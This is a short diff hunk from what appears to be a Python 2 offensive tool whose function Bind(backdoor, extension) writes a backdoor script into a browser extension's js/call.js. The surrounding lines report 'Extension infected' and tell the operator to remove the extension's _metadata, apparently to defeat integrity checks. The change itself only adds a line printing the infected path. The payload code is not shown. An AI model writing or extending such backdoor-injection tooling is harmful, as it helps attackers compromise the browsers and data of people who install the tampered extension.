@@ -71,6 +71,7 @@ def Bind(backdoor, extension):
                     
                     new_call = open(extension + "/js/call.js",'w')
                     print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] Extension infected please remove _metadata !"
+                    print "infected pwd : " + extension
                 except:
                     print "[" + bcolors.OKBLUE + "-" + bcolors.ENDC + "] Can't paste."
             except:
